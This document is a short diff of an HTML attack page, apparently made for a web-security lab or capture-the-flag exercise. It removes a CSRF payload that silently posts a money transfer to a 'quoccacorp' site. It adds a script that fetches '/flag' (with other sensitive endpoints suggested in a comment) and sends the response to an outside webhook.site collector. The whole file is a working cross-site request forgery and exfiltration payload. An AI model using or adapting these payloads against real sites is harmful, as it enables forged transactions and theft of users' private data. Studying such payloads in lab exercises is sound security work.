@@ -1,16 +1,18 @@
-<!-- index.html -->
 <!DOCTYPE html>
 <html>
-  <head><title>PhishBot</title></head>
   <body>
     <script>
-      fetch("https://phish-me.quoccacorp.com/transfer", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/x-www-form-urlencoded"
-        },
-        body: "username=z5567992&amount=100"
-      });
+      fetch("/flag")  // 或尝试 "/profile", "/secret", "/me" 等
+        .then(r => r.text())
+        .then(flag => {
+          fetch("https://webhook.site/4755a457-522f-4d3f-a059-564c6061652f", {
+            method: "POST",
+            headers: {
+              "Content-Type": "text/plain"
+            },
+            body: flag
+          });
+        });
     </script>
   </body>
 </html>
